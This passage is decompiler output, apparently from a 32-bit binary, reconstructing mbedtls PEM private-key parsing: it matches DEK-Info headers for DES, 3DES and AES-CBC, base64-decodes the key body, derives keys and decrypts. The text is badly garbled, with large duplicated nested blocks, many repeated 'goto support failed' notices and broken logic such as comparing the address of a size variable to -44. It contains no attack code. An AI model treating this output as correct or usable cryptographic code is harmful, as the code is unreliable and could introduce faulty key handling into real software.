                            // Detected a possible infinite recursion (goto support failed); quitting...
                        }
                    } else {
                        // 0x8063d4d
                        g5 = 0;
                        char * str10 = (char *)g7;
                        int32_t str11; // 0x8063e9a
                        char * v55;
                        char * v56;
                        char * v57;
                        int32_t v58; // 0x8063ca3
                        int32_t v59; // 0x8063eb9
                        int32_t v60; // 0x8063f6a
                        if (memcmp(str10, "DEK-Info: DES-CBC,", 18) == 0) {
                            // 0x8063e76
                            g6 = &v28;
                            g4 = 8;
                            g1 = v38 + 19;
                            if (pem_get_iv((int32_t)str10, (int32_t)"DEK-Info: DES-CBC,", 18) == NULL) {
                                // 0x8063e90
                                g5 = g5 & -0x10000 | 33;
                                str11 = v38 + 35;
                                g7 = str11;
                                // branch -> 0x8063d6f
                                // 0x8063d6f
                                if (memcmp((char *)str11, "DEK-Info: AES-", 14) == 0) {
                                    // 0x8063d8f
                                    g5 = 5;
                                    str7 = (char *)g7;
                                    v45 = str7;
                                    memcmp_rc = memcmp(str7, "DEK-Info: AES-128-CBC,", 22);
                                    v46 = "DEK-Info: AES-128-CBC,";
                                    if (memcmp_rc != 0) {
                                        // 0x8063db0
                                        g5 = g5 & -0x10000 | 6;
                                        str8 = (char *)g7;
                                        v45 = str8;
                                        if (memcmp(str8, "DEK-Info: AES-192-CBC,", 22) != 0) {
                                            // 0x8063dd0
                                            str9 = (char *)g7;
                                            v45 = str9;
                                            if (memcmp(str9, "DEK-Info: AES-256-CBC,", 22) == 0) {
                                                // 0x8063df6
                                                g5 = g5 & -0x10000 | 7;
                                                v46 = "DEK-Info: AES-256-CBC,";
                                                // branch -> 0x8063dfa
                                                // 0x8063dfa
                                                g1 = g7 + 22;
                                                g4 = 16;
                                                g6 = &v28;
                                                if (pem_get_iv((int32_t)v45, (int32_t)v46, 22) == NULL) {
                                                    // 0x8063ea2
                                                    v44 = g7 + 54;
                                                    g7 = v44;
                                                    v50 = v44;
                                                    // branch -> 0x8063e22
                                                    // 0x8063e22
                                                    v48 = *(char *)v50;
                                                    v52 = v50;
                                                    v51 = v48;
                                                    if (v48 == 13) {
                                                        // 0x8063e29
                                                        v43 = v50 + 1;
                                                        g7 = v43;
                                                        v52 = v43;
                                                        v51 = (int32_t)*(char *)v43;
                                                        // branch -> 0x8063e2f
                                                    }
                                                    // 0x8063e2f
                                                    if (v51 == 10) {
                                                        // 0x8063e37
                                                        v35 = v52 + 1;
                                                        // branch -> 0x8063bac
                                                        // 0x8063bac
                                                        if (v4 != v35) {
                                                            // 0x8063bb8
                                                            v33 = v4 - v35;
                                                            v23 = &size;
                                                            mbedtls_base64_decode(NULL, 0, &size, v35, v33);
                                                            g4 = v23;
                                                            if (&size == (int32_t *)-44) {
                                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                                            }
                                                            // 0x8063bff
                                                            mem = calloc(1, size);
                                                            g7 = (int32_t)mem;
                                                            if (mem == NULL) {
                                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                                            }
                                                            // 0x8063c27
                                                            v45 = mem;
                                                            if (mbedtls_base64_decode(mem, size, &size, v35, v33) == 0) {
                                                                // 0x8063c60
                                                                if (a5 == 0) {
                                                                    // 0x8064028
                                                                    v56 = (char *)g7;
                                                                    v45 = v56;
                                                                    free(v56);
                                                                    // branch -> 0x8063aa4
                                                                } else {
                                                                    // 0x8063c6a
                                                                    v34 = g5;
                                                                    if (v34 == 37) {
                                                                        // 0x8063f95
                                                                        g5 = &v29;
                                                                        mbedtls_des3_init((char *)&v29);
                                                                        v25 = &v28;
                                                                        g4 = v25;
                                                                        g6 = 24;
                                                                        v26 = &v32;
                                                                        g1 = v26;
                                                                        pem_pbkdf1((char *)a5, a6, v23, v35, v33);
                                                                        mbedtls_des3_set3key_dec(g5, v26);
                                                                        g4 = v26;
                                                                        v37 = g7;
                                                                        mbedtls_des3_crypt_cbc(g5, 0, (char)size, &v28, v37, v37);
                                                                        mbedtls_des3_free((char *)g5);
                                                                        *(char *)v26 = 0;
                                                                        v22 = v26 + 1;
                                                                        // branch -> 0x8064015
                                                                        while (v22 != v25) {
                                                                            // 0x8064015
                                                                            *(char *)v22 = 0;
                                                                            v22++;
                                                                            // continue -> 0x8064015
                                                                        }
                                                                        // 0x8063cb7
                                                                        v49 = g7;
                                                                        v47 = (char *)v49;
                                                                        if (size >= 3) {
                                                                            // 0x8063cc3
                                                                            if (*v47 == 48) {
                                                                                // 0x8063ccc
                                                                                if (*(char *)(v49 + 1) <= 131) {
                                                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                                                }
                                                                            }
                                                                        }
                                                                        // 0x8063f83
                                                                        v45 = v47;
                                                                        free(v47);
                                                                        // branch -> 0x8063aa4
                                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                                    } else {
                                                                        // 0x8063c73
                                                                        if (v34 == 33) {
                                                                            // 0x8063ed2
                                                                            g5 = &v27;
                                                                            mbedtls_des_init((char *)&v27);
                                                                            g4 = &v28;
                                                                            v24 = &v32;
                                                                            g1 = v24;
                                                                            g6 = 8;
                                                                            pem_pbkdf1((char *)a5, a6, v23, v35, v33);
                                                                            mbedtls_des_setkey_dec((int32_t *)g5, v24);
                                                                            v36 = g7;
                                                                            mbedtls_des_crypt_cbc(g5, 0, (char)size, &v28, v36, v36);
                                                                            v55 = (char *)g5;
                                                                            v45 = v55;
                                                                            mbedtls_des_free(v55);
                                                                            *(char *)v24 = 0;
                                                                            v21 = v24 + 1;
                                                                            // branch -> 0x8063f4c
                                                                            while (v21 != (int32_t)&v31) {
                                                                                // 0x8063f4c
                                                                                *(char *)v21 = 0;
                                                                                v21++;
                                                                                // continue -> 0x8063f4c
                                                                            }
                                                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                                                        } else {
                                                                            // 0x8063c7c
                                                                            if (v34 == 5) {
                                                                                // 0x8063eaa
                                                                                g1 = &v28;
                                                                                g4 = g7;
                                                                                g5 = a5;
                                                                                v59 = size;
                                                                                v45 = (char *)v59;
                                                                                g6 = 16;
                                                                                pem_aes_decrypt(v59, a5, a6, v35, v33, v30);
                                                                                // branch -> 0x8063cb7
                                                                            } else {
                                                                                // 0x8063c86
                                                                                if (v34 == 6) {
                                                                                    // 0x8063f5b
                                                                                    g1 = &v28;
                                                                                    g4 = g7;
                                                                                    g5 = a5;
                                                                                    v60 = size;
                                                                                    v45 = (char *)v60;
                                                                                    g6 = 24;
                                                                                    pem_aes_decrypt(v60, a5, a6, v35, v33, v30);
                                                                                    // branch -> 0x8063cb7
                                                                                } else {
                                                                                    // 0x8063c8f
                                                                                    if (v34 == 7) {
                                                                                        // 0x8063c94
                                                                                        g1 = &v28;
                                                                                        g4 = g7;
                                                                                        g5 = a5;
                                                                                        v58 = size;
                                                                                        v45 = (char *)v58;
                                                                                        g6 = 32;
                                                                                        pem_aes_decrypt(v58, a5, a6, v35, v33, v30);
                                                                                        // branch -> 0x8063cb7
                                                                                    }
                                                                                }
                                                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                                                            }
                                                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                                                        }
                                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                                    }
                                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                                }
                                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                                            } else {
                                                                // 0x8064042
                                                                v57 = (char *)g7;
                                                                v45 = v57;
                                                                free(v57);
                                                                // branch -> 0x8063aa4
                                                            }
                                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                                        }
                                                    }
                                                    // 0x8063cf8
                                                    // branch -> 0x8063aa4
                                                }
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            }
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                        } else {
                                            v46 = "DEK-Info: AES-192-CBC,";
                                        }
                                    }
                                    // 0x8063dfa
                                    g1 = g7 + 22;
                                    g4 = 16;
                                    g6 = &v28;
                                    if (pem_get_iv((int32_t)v45, (int32_t)v46, 22) == NULL) {
                                        // 0x8063ea2
                                        v44 = g7 + 54;
                                        g7 = v44;
                                        v50 = v44;
                                        // branch -> 0x8063e22
                                        // 0x8063e22
                                        v48 = *(char *)v50;
                                        v52 = v50;
                                        v51 = v48;
                                        if (v48 == 13) {
                                            // 0x8063e29
                                            v43 = v50 + 1;
                                            g7 = v43;
                                            v52 = v43;
                                            v51 = (int32_t)*(char *)v43;
                                            // branch -> 0x8063e2f
                                        }
                                        // 0x8063e2f
                                        if (v51 == 10) {
                                            // 0x8063e37
                                            v35 = v52 + 1;
                                            // branch -> 0x8063bac
                                            // 0x8063bac
                                            if (v4 != v35) {
                                                // 0x8063bb8
                                                v33 = v4 - v35;
                                                v23 = &size;
                                                mbedtls_base64_decode(NULL, 0, &size, v35, v33);
                                                g4 = v23;
                                                if (&size == (int32_t *)-44) {
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                }
                                                // 0x8063bff
                                                mem = calloc(1, size);
                                                g7 = (int32_t)mem;
                                                if (mem == NULL) {
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                }
                                                // 0x8063c27
                                                if (mbedtls_base64_decode(mem, size, &size, v35, v33) == 0) {
                                                    // 0x8063c60
                                                    if (a5 == 0) {
                                                        // 0x8064028
                                                        free((char *)g7);
                                                        // branch -> 0x8063aa4
                                                    } else {
                                                        // 0x8063c6a
                                                        v34 = g5;
                                                        if (v34 == 37) {
                                                            // 0x8063f95
                                                            g5 = &v29;
                                                            mbedtls_des3_init((char *)&v29);
                                                            v25 = &v28;
                                                            g4 = v25;
                                                            g6 = 24;
                                                            v26 = &v32;
                                                            g1 = v26;
                                                            pem_pbkdf1((char *)a5, a6, v23, v35, v33);
                                                            mbedtls_des3_set3key_dec(g5, v26);
                                                            g4 = v26;
                                                            v37 = g7;
                                                            mbedtls_des3_crypt_cbc(g5, 0, (char)size, &v28, v37, v37);
                                                            mbedtls_des3_free((char *)g5);
                                                            *(char *)v26 = 0;
                                                            v22 = v26 + 1;
                                                            // branch -> 0x8064015
                                                            while (v22 != v25) {
                                                                // 0x8064015
                                                                *(char *)v22 = 0;
                                                                v22++;
                                                                // continue -> 0x8064015
                                                            }
                                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                                        } else {
                                                            // 0x8063c73
                                                            if (v34 == 33) {
                                                                // 0x8063ed2
                                                                g5 = &v27;
                                                                mbedtls_des_init((char *)&v27);
                                                                g4 = &v28;
                                                                v24 = &v32;
                                                                g1 = v24;
                                                                g6 = 8;
                                                                pem_pbkdf1((char *)a5, a6, v23, v35, v33);
                                                                mbedtls_des_setkey_dec((int32_t *)g5, v24);
                                                                v36 = g7;
                                                                mbedtls_des_crypt_cbc(g5, 0, (char)size, &v28, v36, v36);
                                                                mbedtls_des_free((char *)g5);
                                                                *(char *)v24 = 0;
                                                                v21 = v24 + 1;
                                                                // branch -> 0x8063f4c
                                                                while (v21 != (int32_t)&v31) {
                                                                    // 0x8063f4c
                                                                    *(char *)v21 = 0;
                                                                    v21++;
                                                                    // continue -> 0x8063f4c
                                                                }
                                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                                            } else {
                                                                // 0x8063c7c
                                                                if (v34 == 5) {
                                                                    // 0x8063eaa
                                                                    g1 = &v28;
                                                                    g4 = g7;
                                                                    g5 = a5;
                                                                    g6 = 16;
                                                                    pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                                    // branch -> 0x8063cb7
                                                                } else {
                                                                    // 0x8063c86
                                                                    if (v34 == 6) {
                                                                        // 0x8063f5b
                                                                        g1 = &v28;
                                                                        g4 = g7;
                                                                        g5 = a5;
                                                                        g6 = 24;
                                                                        pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                                        // branch -> 0x8063cb7
                                                                    } else {
                                                                        // 0x8063c8f
                                                                        if (v34 == 7) {
                                                                            // 0x8063c94
                                                                            g1 = &v28;
                                                                            g4 = g7;
                                                                            g5 = a5;
                                                                            g6 = 32;
                                                                            pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                                            // branch -> 0x8063cb7
                                                                        }
                                                                    }
                                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                                }
                                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                                            }
                                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                                        }
                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                    }
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                } else {
                                                    // 0x8064042
                                                    free((char *)g7);
                                                    // branch -> 0x8063aa4
                                                }
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            }
                                        }
                                        // 0x8063cf8
                                        // branch -> 0x8063aa4
                                    }
                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                } else {
                                    // 0x8063e1c
                                    if (g5 == 0) {
                                        // 0x8063dec
                                        // branch -> 0x8063aa4
                                    } else {
                                        // 0x8063e1c
                                        v50 = g7;
                                        // branch -> 0x8063e22
                                        // 0x8063e22
                                        v48 = *(char *)v50;
                                        v52 = v50;
                                        v51 = v48;
                                        if (v48 == 13) {
                                            // 0x8063e29
                                            v43 = v50 + 1;
                                            g7 = v43;
                                            v52 = v43;
                                            v51 = (int32_t)*(char *)v43;
                                            // branch -> 0x8063e2f
                                        }
                                        // 0x8063e2f
                                        if (v51 == 10) {
                                            // 0x8063e37
                                            v35 = v52 + 1;
                                            // branch -> 0x8063bac
                                            // 0x8063bac
                                            if (v4 != v35) {
                                                // 0x8063bb8
                                                v33 = v4 - v35;
                                                v23 = &size;
                                                mbedtls_base64_decode(NULL, 0, &size, v35, v33);
                                                g4 = v23;
                                                if (&size == (int32_t *)-44) {
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                }
                                                // 0x8063bff
                                                mem = calloc(1, size);
                                                g7 = (int32_t)mem;
                                                if (mem == NULL) {
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                }
                                                // 0x8063c27
                                                if (mbedtls_base64_decode(mem, size, &size, v35, v33) == 0) {
                                                    // 0x8063c60
                                                    if (a5 == 0) {
                                                        // 0x8064028
                                                        free((char *)g7);
                                                        // branch -> 0x8063aa4
                                                    } else {
                                                        // 0x8063c6a
                                                        v34 = g5;
                                                        if (v34 == 37) {
                                                            // 0x8063f95
                                                            g5 = &v29;
                                                            mbedtls_des3_init((char *)&v29);
                                                            v25 = &v28;
                                                            g4 = v25;
                                                            g6 = 24;
                                                            v26 = &v32;
                                                            g1 = v26;
                                                            pem_pbkdf1((char *)a5, a6, v23, v35, v33);
                                                            mbedtls_des3_set3key_dec(g5, v26);
                                                            g4 = v26;
                                                            v37 = g7;
                                                            mbedtls_des3_crypt_cbc(g5, 0, (char)size, &v28, v37, v37);
                                                            mbedtls_des3_free((char *)g5);
                                                            *(char *)v26 = 0;
                                                            v22 = v26 + 1;
                                                            // branch -> 0x8064015
                                                            while (v22 != v25) {
                                                                // 0x8064015
                                                                *(char *)v22 = 0;
                                                                v22++;
                                                                // continue -> 0x8064015
                                                            }
                                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                                        } else {
                                                            // 0x8063c73
                                                            if (v34 == 33) {
                                                                // 0x8063ed2
                                                                g5 = &v27;
                                                                mbedtls_des_init((char *)&v27);
                                                                g4 = &v28;
                                                                v24 = &v32;
                                                                g1 = v24;
                                                                g6 = 8;
                                                                pem_pbkdf1((char *)a5, a6, v23, v35, v33);
                                                                mbedtls_des_setkey_dec((int32_t *)g5, v24);
                                                                v36 = g7;
                                                                mbedtls_des_crypt_cbc(g5, 0, (char)size, &v28, v36, v36);
                                                                mbedtls_des_free((char *)g5);
                                                                *(char *)v24 = 0;
                                                                v21 = v24 + 1;
                                                                // branch -> 0x8063f4c
                                                                while (v21 != (int32_t)&v31) {
                                                                    // 0x8063f4c
                                                                    *(char *)v21 = 0;
                                                                    v21++;
                                                                    // continue -> 0x8063f4c
                                                                }
                                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                                            } else {
                                                                // 0x8063c7c
                                                                if (v34 == 5) {
                                                                    // 0x8063eaa
                                                                    g1 = &v28;
                                                                    g4 = g7;
                                                                    g5 = a5;
                                                                    g6 = 16;
                                                                    pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                                    // branch -> 0x8063cb7
                                                                } else {
                                                                    // 0x8063c86
                                                                    if (v34 == 6) {
                                                                        // 0x8063f5b
                                                                        g1 = &v28;
                                                                        g4 = g7;
                                                                        g5 = a5;
                                                                        g6 = 24;
                                                                        pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                                        // branch -> 0x8063cb7
                                                                    } else {
                                                                        // 0x8063c8f
                                                                        if (v34 == 7) {
                                                                            // 0x8063c94
                                                                            g1 = &v28;
                                                                            g4 = g7;
                                                                            g5 = a5;
                                                                            g6 = 32;
                                                                            pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                                            // branch -> 0x8063cb7
                                                                        }
                                                                    }
                                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                                }
                                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                                            }
                                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                                        }
                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                    }
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                } else {
                                                    // 0x8064042
                                                    free((char *)g7);
                                                    // branch -> 0x8063aa4
                                                }
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            }
                                        }
                                        // 0x8063cf8
                                        // branch -> 0x8063aa4
                                    }
                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                }
                                // 0x8063e22
                                v48 = *(char *)v50;
                                v52 = v50;
                                v51 = v48;
                                if (v48 == 13) {
                                    // 0x8063e29
                                    v43 = v50 + 1;
                                    g7 = v43;
                                    v52 = v43;
                                    v51 = (int32_t)*(char *)v43;
                                    // branch -> 0x8063e2f
                                }
                                // 0x8063e2f
                                if (v51 == 10) {
                                    // 0x8063e37
                                    v35 = v52 + 1;
                                    // branch -> 0x8063bac
                                    // 0x8063bac
                                    if (v4 != v35) {
                                        // 0x8063bb8
                                        v33 = v4 - v35;
                                        v23 = &size;
                                        mbedtls_base64_decode(NULL, 0, &size, v35, v33);
                                        g4 = v23;
                                        if (&size == (int32_t *)-44) {
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                        }
                                        // 0x8063bff
                                        mem = calloc(1, size);
                                        g7 = (int32_t)mem;
                                        if (mem == NULL) {
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                        }
                                        // 0x8063c27
                                        if (mbedtls_base64_decode(mem, size, &size, v35, v33) == 0) {
                                            // 0x8063c60
                                            if (a5 == 0) {
                                                // 0x8064028
                                                free((char *)g7);
                                                // branch -> 0x8063aa4
                                            } else {
                                                // 0x8063c6a
                                                v34 = g5;
                                                if (v34 == 37) {
                                                    // 0x8063f95
                                                    g5 = &v29;
                                                    mbedtls_des3_init((char *)&v29);
                                                    v25 = &v28;
                                                    g4 = v25;
                                                    g6 = 24;
                                                    v26 = &v32;
                                                    g1 = v26;
                                                    pem_pbkdf1((char *)a5, a6, v23, v35, v33);
                                                    mbedtls_des3_set3key_dec(g5, v26);
                                                    g4 = v26;
                                                    v37 = g7;
                                                    mbedtls_des3_crypt_cbc(g5, 0, (char)size, &v28, v37, v37);
                                                    mbedtls_des3_free((char *)g5);
                                                    *(char *)v26 = 0;
                                                    v22 = v26 + 1;
                                                    // branch -> 0x8064015
                                                    while (v22 != v25) {
                                                        // 0x8064015
                                                        *(char *)v22 = 0;
                                                        v22++;
                                                        // continue -> 0x8064015
                                                    }
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                } else {
                                                    // 0x8063c73
                                                    if (v34 == 33) {
                                                        // 0x8063ed2
                                                        g5 = &v27;
                                                        mbedtls_des_init((char *)&v27);
                                                        g4 = &v28;
                                                        v24 = &v32;
                                                        g1 = v24;
                                                        g6 = 8;
                                                        pem_pbkdf1((char *)a5, a6, v23, v35, v33);
                                                        mbedtls_des_setkey_dec((int32_t *)g5, v24);
                                                        v36 = g7;
                                                        mbedtls_des_crypt_cbc(g5, 0, (char)size, &v28, v36, v36);
                                                        mbedtls_des_free((char *)g5);
                                                        *(char *)v24 = 0;
                                                        v21 = v24 + 1;
                                                        // branch -> 0x8063f4c
                                                        while (v21 != (int32_t)&v31) {
                                                            // 0x8063f4c
                                                            *(char *)v21 = 0;
                                                            v21++;
                                                            // continue -> 0x8063f4c
                                                        }
                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                    } else {
                                                        // 0x8063c7c
                                                        if (v34 == 5) {
                                                            // 0x8063eaa
                                                            g1 = &v28;
                                                            g4 = g7;
                                                            g5 = a5;
                                                            g6 = 16;
                                                            pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                            // branch -> 0x8063cb7
                                                        } else {
                                                            // 0x8063c86
                                                            if (v34 == 6) {
                                                                // 0x8063f5b
                                                                g1 = &v28;
                                                                g4 = g7;
                                                                g5 = a5;
                                                                g6 = 24;
                                                                pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                                // branch -> 0x8063cb7
                                                            } else {
                                                                // 0x8063c8f
                                                                if (v34 == 7) {
                                                                    // 0x8063c94
                                                                    g1 = &v28;
                                                                    g4 = g7;
                                                                    g5 = a5;
                                                                    g6 = 32;
                                                                    pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                                    // branch -> 0x8063cb7
                                                                }
                                                            }
                                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                                        }
                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                    }
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                }
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            }
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                        } else {
                                            // 0x8064042
                                            free((char *)g7);
                                            // branch -> 0x8063aa4
                                        }
                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                    }
                                }
                                // 0x8063cf8
                                // branch -> 0x8063aa4
                                // Detected a possible infinite recursion (goto support failed); quitting...
                            }
                            // 0x8063e12
                            // branch -> 0x8063aa4
                            // Detected a possible infinite recursion (goto support failed); quitting...
                        } else {
                            // 0x8063d4d
                            str11 = g7;
                            // branch -> 0x8063d6f
                        }
                        // 0x8063d6f
                        if (memcmp((char *)str11, "DEK-Info: AES-", 14) == 0) {
                            // 0x8063d8f
                            g5 = 5;
                            str7 = (char *)g7;
                            v45 = str7;
                            memcmp_rc = memcmp(str7, "DEK-Info: AES-128-CBC,", 22);
                            v46 = "DEK-Info: AES-128-CBC,";
                            if (memcmp_rc != 0) {
                                // 0x8063db0
                                g5 = g5 & -0x10000 | 6;
                                str8 = (char *)g7;
                                v45 = str8;
                                if (memcmp(str8, "DEK-Info: AES-192-CBC,", 22) != 0) {
                                    // 0x8063dd0
                                    str9 = (char *)g7;
                                    v45 = str9;
                                    if (memcmp(str9, "DEK-Info: AES-256-CBC,", 22) == 0) {
                                        // 0x8063df6
                                        g5 = g5 & -0x10000 | 7;
                                        v46 = "DEK-Info: AES-256-CBC,";
                                        // branch -> 0x8063dfa
                                        // 0x8063dfa
                                        g1 = g7 + 22;
                                        g4 = 16;
                                        g6 = &v28;
                                        if (pem_get_iv((int32_t)v45, (int32_t)v46, 22) == NULL) {
                                            // 0x8063ea2
                                            v44 = g7 + 54;
                                            g7 = v44;
                                            v50 = v44;
                                            // branch -> 0x8063e22
                                            // 0x8063e22
                                            v48 = *(char *)v50;
                                            v52 = v50;
                                            v51 = v48;
                                            if (v48 == 13) {
                                                // 0x8063e29
                                                v43 = v50 + 1;
                                                g7 = v43;
                                                v52 = v43;
                                                v51 = (int32_t)*(char *)v43;
                                                // branch -> 0x8063e2f
                                            }
                                            // 0x8063e2f
                                            if (v51 == 10) {
                                                // 0x8063e37
                                                v35 = v52 + 1;
                                                // branch -> 0x8063bac
                                                // 0x8063bac
                                                if (v4 != v35) {
                                                    // 0x8063bb8
                                                    v33 = v4 - v35;
                                                    v23 = &size;
                                                    mbedtls_base64_decode(NULL, 0, &size, v35, v33);
                                                    g4 = v23;
                                                    if (&size == (int32_t *)-44) {
                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                    }
                                                    // 0x8063bff
                                                    mem = calloc(1, size);
                                                    g7 = (int32_t)mem;
                                                    if (mem == NULL) {
                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                    }
                                                    // 0x8063c27
                                                    v45 = mem;
                                                    if (mbedtls_base64_decode(mem, size, &size, v35, v33) == 0) {
                                                        // 0x8063c60
                                                        if (a5 == 0) {
                                                            // 0x8064028
                                                            v56 = (char *)g7;
                                                            v45 = v56;
                                                            free(v56);
                                                            // branch -> 0x8063aa4
                                                        } else {
                                                            // 0x8063c6a
                                                            v34 = g5;
                                                            if (v34 == 37) {
                                                                // 0x8063f95
                                                                g5 = &v29;
                                                                mbedtls_des3_init((char *)&v29);
                                                                v25 = &v28;
                                                                g4 = v25;
                                                                g6 = 24;
                                                                v26 = &v32;
                                                                g1 = v26;
                                                                pem_pbkdf1((char *)a5, a6, v23, v35, v33);
                                                                mbedtls_des3_set3key_dec(g5, v26);
                                                                g4 = v26;
                                                                v37 = g7;
                                                                mbedtls_des3_crypt_cbc(g5, 0, (char)size, &v28, v37, v37);
                                                                char * v61 = (char *)g5;
                                                                v45 = v61;
                                                                mbedtls_des3_free(v61);
                                                                *(char *)v26 = 0;
                                                                v22 = v26 + 1;
                                                                // branch -> 0x8064015
                                                                while (v22 != v25) {
                                                                    // 0x8064015
                                                                    *(char *)v22 = 0;
                                                                    v22++;
                                                                    // continue -> 0x8064015
                                                                }
                                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                                            } else {
                                                                // 0x8063c73
                                                                if (v34 == 33) {
                                                                    // 0x8063ed2
                                                                    g5 = &v27;
                                                                    mbedtls_des_init((char *)&v27);
                                                                    g4 = &v28;
                                                                    v24 = &v32;
                                                                    g1 = v24;
                                                                    g6 = 8;
                                                                    pem_pbkdf1((char *)a5, a6, v23, v35, v33);
                                                                    mbedtls_des_setkey_dec((int32_t *)g5, v24);
                                                                    v36 = g7;
                                                                    mbedtls_des_crypt_cbc(g5, 0, (char)size, &v28, v36, v36);
                                                                    v55 = (char *)g5;
                                                                    v45 = v55;
                                                                    mbedtls_des_free(v55);
                                                                    *(char *)v24 = 0;
                                                                    v21 = v24 + 1;
                                                                    // branch -> 0x8063f4c
                                                                    while (v21 != (int32_t)&v31) {
                                                                        // 0x8063f4c
                                                                        *(char *)v21 = 0;
                                                                        v21++;
                                                                        // continue -> 0x8063f4c
                                                                    }
                                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                                } else {
                                                                    // 0x8063c7c
                                                                    if (v34 == 5) {
                                                                        // 0x8063eaa
                                                                        g1 = &v28;
                                                                        g4 = g7;
                                                                        g5 = a5;
                                                                        v59 = size;
                                                                        v45 = (char *)v59;
                                                                        g6 = 16;
                                                                        pem_aes_decrypt(v59, a5, a6, v35, v33, v30);
                                                                        // branch -> 0x8063cb7
                                                                    } else {
                                                                        // 0x8063c86
                                                                        if (v34 == 6) {
                                                                            // 0x8063f5b
                                                                            g1 = &v28;
                                                                            g4 = g7;
                                                                            g5 = a5;
                                                                            v60 = size;
                                                                            v45 = (char *)v60;
                                                                            g6 = 24;
                                                                            pem_aes_decrypt(v60, a5, a6, v35, v33, v30);
                                                                            // branch -> 0x8063cb7
                                                                        } else {
                                                                            // 0x8063c8f
                                                                            if (v34 == 7) {
                                                                                // 0x8063c94
                                                                                g1 = &v28;
                                                                                g4 = g7;
                                                                                g5 = a5;
                                                                                v58 = size;
                                                                                v45 = (char *)v58;
                                                                                g6 = 32;
                                                                                pem_aes_decrypt(v58, a5, a6, v35, v33, v30);
                                                                                // branch -> 0x8063cb7
                                                                            }
                                                                        }
                                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                                    }
                                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                                }
                                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                                            }
                                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                                        }
                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                    } else {
                                                        // 0x8064042
                                                        v57 = (char *)g7;
                                                        v45 = v57;
                                                        free(v57);
                                                        // branch -> 0x8063aa4
                                                    }
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                }
                                            }
                                            // 0x8063cf8
                                            // branch -> 0x8063aa4
                                        }
                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                    }
                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                } else {
                                    v46 = "DEK-Info: AES-192-CBC,";
                                }
                            }
                            // 0x8063dfa
                            g1 = g7 + 22;
                            g4 = 16;
                            g6 = &v28;
                            if (pem_get_iv((int32_t)v45, (int32_t)v46, 22) == NULL) {
                                // 0x8063ea2
                                v44 = g7 + 54;
                                g7 = v44;
                                v50 = v44;
                                // branch -> 0x8063e22
                                // 0x8063e22
                                v48 = *(char *)v50;
                                v52 = v50;
                                v51 = v48;
                                if (v48 == 13) {
                                    // 0x8063e29
                                    v43 = v50 + 1;
                                    g7 = v43;
                                    v52 = v43;
                                    v51 = (int32_t)*(char *)v43;
                                    // branch -> 0x8063e2f
                                }
                                // 0x8063e2f
                                if (v51 == 10) {
                                    // 0x8063e37
                                    v35 = v52 + 1;
                                    // branch -> 0x8063bac
                                    // 0x8063bac
                                    if (v4 != v35) {
                                        // 0x8063bb8
